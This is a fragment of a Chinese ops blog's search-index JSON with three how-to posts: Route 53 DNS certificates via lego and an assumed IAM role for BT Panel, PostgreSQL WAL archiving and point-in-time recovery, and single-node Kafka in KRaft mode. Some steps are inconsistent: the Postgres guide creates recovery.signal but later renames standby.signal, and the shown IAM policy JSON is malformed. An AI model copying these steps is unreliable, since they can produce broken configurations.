{ \u0026#34;Effect\u0026#34;: \u0026#34;Allow\u0026#34;, \u0026#34;Action\u0026#34;: \u0026#34;sts:AssumeRole\u0026#34;, \u0026#34;Resource\u0026#34;: \u0026#34;arn:aws:iam::111111111111:role/RealUpdateCertRole\u0026#34; } ] } 中间111111111是account id\n然后GEN出一对访问密钥\n四、配置aws cd .aws cat credentials [CertProxyUser] aws_access_key_id = AK11111111111111 aws_secret_access_key = 222222222222222 cat config [profile CertProxyUser] [profile RealUpdateCertRole] role_arn = arn:aws:iam::111111111111:role/RealUpdateCertRole source_profile = CertProxyUser 五、撰写lego获取证书的脚本 /usr/local/bin/get-cert.sh，它会自动用CertProxyUser凭据，获得RealUpdateCertRole的角色，然后去拿到证书\n#!/bin/bash AWS_PROFILE_NAME=\u0026#34;RealUpdateCertRole\u0026#34; CREDENTIALS=$(aws sts assume-role \\ --role-arn \u0026#34;$(aws configure get role_arn --profile ${AWS_PROFILE_NAME})\u0026#34; \\ --role-session-name \u0026#34;${AWS_PROFILE_NAME}-session-$(date +%s)\u0026#34; \\ --profile \u0026#34;$(aws configure get source_profile --profile ${AWS_PROFILE_NAME})\u0026#34; \\ --output json) if [ $? -ne 0 ]; then echo \u0026#34;Error: Failed to assume role. Please check your IAM role, source profile, and network connectivity.\u0026#34; exit 1 fi export AWS_ACCESS_KEY_ID=$(echo \u0026#34;$CREDENTIALS\u0026#34; | jq -r \u0026#39;.Credentials.AccessKeyId\u0026#39;) export AWS_SECRET_ACCESS_KEY=$(echo \u0026#34;$CREDENTIALS\u0026#34; | jq -r \u0026#39;.Credentials.SecretAccessKey\u0026#39;) export AWS_SESSION_TOKEN=$(echo \u0026#34;$CREDENTIALS\u0026#34; | jq -r \u0026#39;.Credentials.SessionToken\u0026#39;) export AWS_REGION=ap-southeast-1 export AWS_HOSTED_ZONE_ID=Z1111111111111111111 /usr/local/bin/lego --path /usr/local/bin/certs --domains *.example.com --domains example.com --email zhangranrui@gmail.com --dns route53 --accept-tos=true renew --renew-hook=\u0026#34;/usr/local/bin/update-cert.sh\u0026#34; /usr/local/bin/update-cert.sh 就是更新宝塔证书的过程\n#!/bin/bash cp /usr/local/bin/certs/certificates/_.example.com.crt /www/server/panel/vhost/cert/example.com/fullchain.pem cp /usr/local/bin/certs/certificates/_.example.com.key /www/server/panel/vhost/cert/example.com/privkey.pem /etc/init.d/nginx reload 其实就是替换掉vhost下的证书，然后重启Nginx。\n这样就搞定了。\n","permalink":"https://rendoumi.com/posts/20250729-route53_lego_bt_certificate/","summary":"\u003cp\u003e上一篇我们说了 \u003ca href=\"posts/20250725-aws_route53_update_certificate/\"\u003eAws的EC2服务器用lego获得免费证书并更新到ACM\u003c/a\u003e，这下又来了个更加有难度的挑战：\u003c/p\u003e\n\u003cp\u003eDNS解析是放在了AWS Route 53上，然后vps上跑着BT宝塔，用来代理转发开发环境的https证书\u003c/p\u003e\n\u003cp\u003e这个环境如何用lego来安全的申请到证书并配置宝塔呢？这回可不像EC2那样可以自动附加IAM角色了\u003c/p\u003e\n\u003cp\u003e我们先来看看lego的用法吧：\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://go-acme.github.io/lego/dns/route53/\"\u003ehttps://go-acme.github.io/lego/dns/route53/\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e语法如下：\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250729091919259\" loading=\"lazy\" src=\"/posts/20250729-route53_lego_bt_certificate/image-20250729091919259.png\"\u003e\u003c/p\u003e\n\u003cp\u003e继续看，看来必须需要IAM的凭据才可以，继续下拉，有使用IAM的policy，那我们必须创建一个Role角色，然后再建立一个代理用户，gen出key，通过这个代理用户的凭据来间接进行访问\u003c/p\u003e\n\u003cp\u003e步骤如下：\u003c/p\u003e\n\u003ch5 id=\"一去route53拿到arn\"\u003e一、去route53，拿到arn\u003c/h5\u003e\n\u003cp\u003e我们要拿到具体域名的zone ID，就是Z0打头的那一串\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250729092241728\" loading=\"lazy\" src=\"/posts/20250729-route53_lego_bt_certificate/image-20250729092241728.png\"\u003e\u003c/p\u003e\n\u003ch5 id=\"二建立iam实际工作的role\"\u003e二、建立IAM实际工作的Role\u003c/h5\u003e\n\u003cp\u003e首先建立一个Policy，route53AcmeCert\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;Version\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;2012-10-17\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e    \u0026#34;\u003c/span\u003eStatement\u003cspan class=\"s2\"\u003e\u0026#34;: [\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e        \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e            \u0026#34;\u003c/span\u003eEffect\u003cspan class=\"s2\"\u003e\u0026#34;: \u0026#34;\u003c/span\u003eAllow\u003cspan class=\"s2\"\u003e\u0026#34;,\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e            \u0026#34;\u003c/span\u003eAction\u003cspan class=\"s2\"\u003e\u0026#34;: \u0026#34;\u003c/span\u003eroute53:GetChange\u003cspan class=\"s2\"\u003e\u0026#34;,\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e            \u0026#34;\u003c/span\u003eResource\u003cspan class=\"s2\"\u003e\u0026#34;: \u0026#34;\u003c/span\u003earn:aws:route53:::change/*\u003cspan class=\"s2\"\u003e\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e        },\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e        {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e            \u0026#34;\u003c/span\u003eEffect\u003cspan class=\"s2\"\u003e\u0026#34;: \u0026#34;\u003c/span\u003eAllow\u003cspan class=\"s2\"\u003e\u0026#34;,\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e            \u0026#34;\u003c/span\u003eAction\u003cspan class=\"s2\"\u003e\u0026#34;: \u0026#34;\u003c/span\u003eroute53:ListHostedZonesByName\u003cspan class=\"s2\"\u003e\u0026#34;,\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e        },\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e        {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e            \u0026#34;\u003c/span\u003eEffect\u003cspan class=\"s2\"\u003e\u0026#34;: \u0026#34;\u003c/span\u003eAllow\u003cspan class=\"s2\"\u003e\u0026#34;,\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e            \u0026#34;\u003c/span\u003eAction\u003cspan class=\"s2\"\u003e\u0026#34;: [\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                \u0026#34;\u003c/span\u003eroute53:ListResourceRecordSets\u003cspan class=\"s2\"\u003e\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e            ],\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e            \u0026#34;\u003c/span\u003eResource\u003cspan class=\"s2\"\u003e\u0026#34;: [\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                \u0026#34;\u003c/span\u003earn:aws:route53:::hostedzone/Z01111111111111111111\u003cspan class=\"s2\"\u003e\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e            ]\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e        },\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e        {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e            \u0026#34;\u003c/span\u003eEffect\u003cspan class=\"s2\"\u003e\u0026#34;: \u0026#34;\u003c/span\u003eAllow\u003cspan class=\"s2\"\u003e\u0026#34;,\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e            \u0026#34;\u003c/span\u003eAction\u003cspan class=\"s2\"\u003e\u0026#34;: [\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                \u0026#34;\u003c/span\u003eroute53:ChangeResourceRecordSets\u003cspan class=\"s2\"\u003e\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e            ],\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e            \u0026#34;\u003c/span\u003eResource\u003cspan class=\"s2\"\u003e\u0026#34;: [\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                \u0026#34;\u003c/span\u003earn:aws:route53:::hostedzone/Z01111111111111111111\u003cspan class=\"s2\"\u003e\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e            ],\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e            \u0026#34;\u003c/span\u003eCondition\u003cspan class=\"s2\"\u003e\u0026#34;: {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                \u0026#34;\u003c/span\u003eForAllValues:StringEquals\u003cspan class=\"s2\"\u003e\u0026#34;: {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                    \u0026#34;\u003c/span\u003eroute53:ChangeResourceRecordSetsNormalizedRecordNames\u003cspan class=\"s2\"\u003e\u0026#34;: [\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                        \u0026#34;\u003c/span\u003e_acme-challenge.example.com\u003cspan class=\"s2\"\u003e\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                    ],\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                    \u0026#34;\u003c/span\u003eroute53:ChangeResourceRecordSetsRecordTypes\u003cspan class=\"s2\"\u003e\u0026#34;: [\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                        \u0026#34;\u003c/span\u003eTXT\u003cspan class=\"s2\"\u003e\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                    ]\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e            }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e        }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e    ]\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e然后建立一个Role，RealUpdateCertRole，绑定上面的策略\u003c/p\u003e","title":"上难度----\u003e内网vps用lego申请route53 DNS证书并更新到BT宝塔"},{"content":"研究了Postgres的库数据恢复和转移，再来研究一下PITR按时间点恢复\n类比到MySQL，因为我们是运维，不是专业的DBA，所以恢复到正确数据即可\n那跟阿里云以及自建的MySQL恢复一样，首先都要有一个每天的基础备份，然后类比MySQL的Binlog，Postgres这里就相当于wal。\n这么类比就对了，那么恢复过程的思路是一样的：\n首先建立一个新的实例 第二步把每天的基础物理全备给恢复上去 第三步把之后的wal日志传到新实例，恢复到指定时间点 第四步最后把表或库Dump下来，灌入到旧实例的新表或新库 那我们一步一步来解释：\n一、每天建立一个基础备份，这样在Base基础上，只需恢复当天的wal，速度够快 建立每天的Base基础物理备份\npg_basebackup -Ft -Pv -Xf -z -Z5 -U postgres -h localhost -p 5432 -D /pg_backup 解释一下： -Ft： 指定备份格式为 tar。 如果使用 tar 格式，备份会输出 tar 文件，并且不需要直接访问 PostgreSQL 数据目录。 -Pv： -P：显示备份进度。 -v：启用详情模式（verbose），显示更多日志。 -Xf： -X：控制 WAL 日志的处理方式，f 表示在备份中包含 WAL 文件（Write Ahead Logs），确保备份可以用于恢复到完整的一致状态。 -z： 启用压缩功能。 -Z5： 设置压缩级别为 5（压缩级别从 0 到 9，9 为最高压缩）。 -U postgres： 使用 postgres 用户来连接数据库。 -h localhost： 指定数据库主机为当前机器（localhost）。 -p 5432： 指定 PostgreSQL 监听端口为 5432（默认端口）。 -D /pg_backup： 将备份文件保存到指定路径 /pg_backup 中。 这样我们就在 /pg_backup 中有了备份文件，包括一个backup_manifest的文件清单，以及一个压缩包\nroot@debian:/pg_backup# ls -lha total 1.8G drwxr-xr-x 3 root root 4.0K Jul 28 16:31 . drwxr-xr-x 20 root root 4.0K Jul 28 16:18 .. -rw------- 1 root root 760K Jul 28 16:21 backup_manifest -rw------- 1 root root 1.8G Jul 28 16:21 base.tar.gz 那这个base.tar.gz里面又都有什么呢？\n/ ├── base/ # 每个数据库的文件 ├── global/ # 全局对象（角色、权限） ├── pg_wal/ # WAL 日志 ├── pg_xact/ # 事务状态 ├── pg_clog/ # 事务提交信息 ├── postgresql.auto.conf # 自动配置文件 ├── postgresql.conf # 主配置文件 ├── pg_hba.conf # 访问控制文件 ├── pg_ident.conf # 用户映射文件 └── ... # 其他系统文件 我们先 ps axjf 看一把\n可以看到，-D的数据目录是在/var/lib/postgresql/13/main下，那base.tar.gz里面的内容跟/var/lib/postgresql/13/main下是一样的。\n二、旧实例需要建立wal的归档模式 # ps axjf的结果中，看到配置文件是 /etc/postgresql/13/main/postgresql.conf # 那就修改这个配置文件 # 修改以下2行 # 启用归档 archive_mode = on # WAL 日志归档路径 archive_command = \u0026#39;cp %p /path_to_archive_directory/%f\u0026#39; # 然后重启服务生效 systemctl restart postgresql 以上做完后我们如果我们做了Base备份，然后wal的日志还在继续跑，那我们就需要手动触发一下wal写盘\nselect pg_switch_wal(); pg_switch_wal --------------- 0/13DAC308 会得到一个序列号：0/13DAC308\n然后新的wal归档日志就放在：/path_to_archive_directory/目录下了，那原始的wal数据文件还在 /var/lib/postgresql/13/main/pg_wal 下\n三、新实例恢复Base库和时间点： # 找到新实例的数据目录，一把删空，然后把base.tar.gz解压进去 # 建恢复目录并清理旧数据 # 将解压后的备份移到数据库实例的实际数据目录（通常位于 /var/lib/postgresql/data）。清理旧目录后执行： mv /pg_restore/ /var/lib/postgresql/data # 设置恢复配置文件 # 在数据目录中创建一个名为 recovery.signal 的空文件，同时在数据目录中新增恢复目标的配置文件 postgresql.auto.conf。 touch recovery.signal #编辑或创建文件 postgresql.auto.conf： vi /var/lib/postgresql/data/postgresql.auto.conf # 添加以下内容： # 旧实例的wal文件需要事先copy到新实例的 /path_to_archive_directory 目录下 primary_conninfo = \u0026#39;\u0026#39; restore_command = \u0026#39;cp /path_to_archive_directory/%f %p\u0026#39; recovery_target_time = \u0026#39;YYYY-MM-DD HH:MI:SS\u0026#39; recovery_target_action = \u0026#39;pause\u0026#39; 说明：\nrestore_command：用于指定如何恢复 WAL 日志。这里的命令是从归档目录 /path_to_archive_directory/ 中拷贝 WAL 日志到 PostgreSQL 数据目录。\nrecovery_target_time：你希望恢复到的时间点精确到秒（UTC 时间）。\nrecovery_target_action：在完成恢复到目标时间后，pause 表示暂停恢复并进入只读模式\n然后开始恢复：\n# 确保 PostgreSQL 数据目录已准备好，删除目录下旧的 postmaster.pid 等文件： rm /var/lib/postgresql/data/postmaster.pid # 启动 PostgreSQL 服务： systemctl start postgresql # 确认恢复进度 # 观察 PostgreSQL 的日志文件（通常位于 /var/log/postgresql/postgresql-X.log，具体路径根据配置文件可能不同）： tail -f /var/log/postgresql/postgresql-X.log # 如果一切正常，你应该能看到以下内容： consistent recovery point reached at 0/16B6F98 recovery stopping at specified recovery target # 退出恢复模式 mv /var/lib/postgresql/data/standby.signal /var/lib/postgresql/data/standby.signal.bak # 退出恢复模式后，确认是只读模式 SELECT pg_is_in_recovery(); # 如果要进入可读可写的模式 select pg_wal_replay_resume(); 四、dump出新实例指定表或库的数据，然后灌回旧实例的新表或新库 这个过程就不多说了。\n多说一句，可以恢复到某个时间点，事务或者wal序列号\n# 恢复到不同时间点 # 假设第一次恢复后，你希望尝试恢复到另一个时间点，修改 postgresql.auto.conf 文件中的 recovery_target_time 然后同样重复以上步骤即可重新恢复。 recovery_target_time = \u0026#39;YYYY-MM-DD HH:MI:SS\u0026#39; # 以某个事务为目标： recovery_target_xid = \u0026#39;12345\u0026#39; #以某个 WAL 日志序列号为目标： recovery_target_lsn = \u0026#39;0/16B6F98\u0026#39; 总结一下：无论postgres还是mysql，一键恢复的功能，最好都是新起一个实例，然后把基础备份恢复上去，然后用binlog或wal归档日志进行恢复，然后导出数据，最后灌入到旧实例中，这样最稳妥，旧实例也不会停服务！！！\n","permalink":"https://rendoumi.com/posts/20250728-postgres_wal_pitr/","summary":"\u003cp\u003e研究了Postgres的库数据恢复和转移，再来研究一下PITR按时间点恢复\u003c/p\u003e\n\u003cp\u003e类比到MySQL，因为我们是运维，不是专业的DBA，所以恢复到正确数据即可\u003c/p\u003e\n\u003cp\u003e那跟阿里云以及自建的MySQL恢复一样，首先都要有一个每天的基础备份，然后类比MySQL的Binlog，Postgres这里就相当于wal。\u003c/p\u003e\n\u003cp\u003e这么类比就对了，那么恢复过程的思路是一样的：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e首先建立一个新的实例\u003c/li\u003e\n\u003cli\u003e第二步把每天的基础物理全备给恢复上去\u003c/li\u003e\n\u003cli\u003e第三步把之后的wal日志传到新实例，恢复到指定时间点\u003c/li\u003e\n\u003cli\u003e第四步最后把表或库Dump下来，灌入到旧实例的新表或新库\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e那我们一步一步来解释：\u003c/p\u003e\n\u003ch5 id=\"一每天建立一个基础备份这样在base基础上只需恢复当天的wal速度够快\"\u003e一、每天建立一个基础备份，这样在Base基础上，只需恢复当天的wal，速度够快\u003c/h5\u003e\n\u003cp\u003e建立每天的Base基础物理备份\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003epg_basebackup -Ft -Pv -Xf -z -Z5 -U postgres -h localhost -p \u003cspan class=\"m\"\u003e5432\u003c/span\u003e -D /pg_backup\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e解释一下：\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    -Ft：\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        指定备份格式为 tar。\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        如果使用 tar 格式，备份会输出 tar 文件，并且不需要直接访问 PostgreSQL 数据目录。\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    -Pv：\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        -P：显示备份进度。\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        -v：启用详情模式（verbose），显示更多日志。\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    -Xf：\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        -X：控制 WAL 日志的处理方式，f 表示在备份中包含 WAL 文件（Write Ahead Logs），确保备份可以用于恢复到完整的一致状态。\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    -z：\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        启用压缩功能。\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    -Z5：\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        设置压缩级别为 5（压缩级别从 \u003cspan class=\"m\"\u003e0\u003c/span\u003e 到 9，9 为最高压缩）。\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    -U postgres：\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        使用 postgres 用户来连接数据库。\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    -h localhost：\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        指定数据库主机为当前机器（localhost）。\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    -p 5432：\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        指定 PostgreSQL 监听端口为 5432（默认端口）。\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    -D /pg_backup：\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        将备份文件保存到指定路径 /pg_backup 中。\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e这样我们就在 /pg_backup 中有了备份文件，包括一个backup_manifest的文件清单，以及一个压缩包\u003c/p\u003e","title":"Postgres的wal和PITR时间点恢复"},{"content":"上一篇说了用Docker部署kafka，后端不用zookeeper，改用kraft。\n这一篇说说不用Docker，直接单机部署kafka用kraft的方法。\n一、准备，虚机的话需要4cpu 8G内存\n# 装好java java --version 建3个目录 # 放kafka的2进制可执行文件 mkdir -p /opt/kafka # 放kafka的日志文件 mkdir -p /var/log/kafka # 放kafka的数据文件 mkdir -p /var/lib/kafka 二、下载并配置kafka\n# 释放到指定目录 tar -xzf kafka_2.13-3.5.0.tgz -C /opt/kafka # 修改/opt/kafka/config/server.properties process.roles=broker,controller node.id=1 controller.quorum.voters=1@localhost:9093 listeners=PLAINTEXT://localhost:9092,CONTROLLER://localhost:9093 log.dirs=/var/lib/kafka # 然后需要再追加到server.properties的部分 metadata.log.dir=/var/lib/kafka/metadata num.replica.fetchers=1 offsets.topic.replication.factor=1 transaction.state.log.replication.factor=1 transaction.state.log.min.isr=1 三、初始化kafka集群\n# 生成一个uuid uuidgen dc66bcb0-758e-4360-843d-5ccb1da2ee74 # 初始化 cd /opt/kafka bin/kafka-storage.sh format -t \u0026lt;UUID\u0026gt; -c config/server.properties # 启动 bin/kafka-server-start.sh config/server.properties # 检查一下代理的状态 bin/kafka-broker-api-versions.sh --bootstrap-server localhost:9092 四、推送数据验证\n# 创建topic bin/kafka-topics.sh --create --topic my-new-topic --bootstrap-server localhost:9092 --partitions 3 --replication-factor 1 # 列出topic bin/kafka-topics.sh --list --bootstrap-server localhost:9092 # 看看topic的属性 bin/kafka-topics.sh --describe --topic my-new-topic --bootstrap-server localhost:9092 # 生产一些消息放进topic bin/kafka-console-producer.sh --topic my-new-topic --bootstrap-server localhost:9092 # 消费这些消息 bin/kafka-console-consumer.sh --topic my-new-topic --from-beginning --bootstrap-server localhost:9092 # 如何遇到问题，查看日志 tail -f /var/log/kafka/server.log ","permalink":"https://rendoumi.com/posts/20250728-kafka_kraft_alone/","summary":"\u003cp\u003e上一篇说了用Docker部署kafka，后端不用zookeeper，改用kraft。\u003c/p\u003e\n\u003cp\u003e这一篇说说不用Docker，直接单机部署kafka用kraft的方法。\u003c/p\u003e\n\u003cp\u003e一、准备，虚机的话需要4cpu 8G内存\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 装好java\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ejava --version\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e建3个目录\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 放kafka的2进制可执行文件\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emkdir -p /opt/kafka  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 放kafka的日志文件\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emkdir -p /var/log/kafka\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan 